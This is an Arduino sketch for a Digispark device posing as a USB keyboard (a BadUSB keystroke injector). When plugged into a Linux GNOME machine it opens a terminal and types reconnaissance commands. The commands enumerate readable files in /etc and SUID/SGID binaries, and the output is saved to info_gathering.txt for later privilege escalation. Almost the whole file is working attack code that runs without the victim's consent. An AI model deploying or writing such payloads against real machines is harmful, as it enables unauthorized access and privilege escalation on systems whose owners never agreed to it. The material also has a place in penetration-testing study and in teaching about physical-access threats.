#define kbd_es_es
#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.update();
  DigiKeyboard.delay(5000);
}

void loop() {
  DigiKeyboard.sendKeyStroke(KEY_F2,MOD_ALT_LEFT);
  delay(3000);
  DigiKeyboard.println("gnome-terminal");
  delay(3000);
  DigiKeyboard.println("echo \"Find Readable Folders in /etc: \" >> info_gathering.txt");
  delay(2000);
  DigiKeyboard.println("find /etc -user $(id -u) -perm -u=r -o -group $(id -g) -perm -g=r -o -perm -o=r -ls 2> /dev/null >> info_gathering.txt");
  delay(2000);
  DigiKeyboard.println("echo >> info_gathering.txt");
  delay(2000);
  DigiKeyboard.println("echo \"Find SUID and GUID files\" >> info_gathering.txt");
  delay(2000);
  DigiKeyboard.println("find / -type f -perm -u=s -o -type f -perm -g=s -ls  2> /dev/null >> info_gathering.txt");
  delay(5000);
  DigiKeyboard.println("exit");
  delay(2000);
  while(1);
}
